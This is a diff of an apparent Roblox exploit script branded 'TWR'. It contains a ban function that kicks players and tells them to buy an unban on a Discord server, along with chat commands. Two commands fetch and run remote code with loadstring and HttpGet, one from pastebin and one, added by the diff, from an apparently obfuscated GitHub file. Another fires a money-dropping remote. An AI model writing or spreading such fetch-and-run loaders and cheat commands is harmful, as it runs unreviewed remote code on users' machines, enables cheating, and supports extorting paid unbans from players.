@@ -1,4 +1,4 @@
--- BLACKLISTTTTTTTTTTTTTTTT
+-- BLACKLISTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
 
 local function banPlayer(player)
     player:Kick("TWR Has banned you from this script, you can buy an unban on our Discord server. discord.gg/R57rsmdAzk")
@@ -4940,6 +4940,9 @@ local function handleCommand(player, message)
 
                 elseif message == string.lower(prefix.."su .") then
                 loadstring(game:HttpGet("https://pastebin.com/raw/mWJdMhJL", true))()
+
+                elseif message == string.lower(prefix.."reexec .") then
+                    loadstring(game:HttpGet("https://github.com/ravefrr/obf2/raw/main/twrexec", true))() 
 
                 elseif message == string.lower(prefix.."dropcash .") then 
                     local args = {"DropMoney", "10000"}
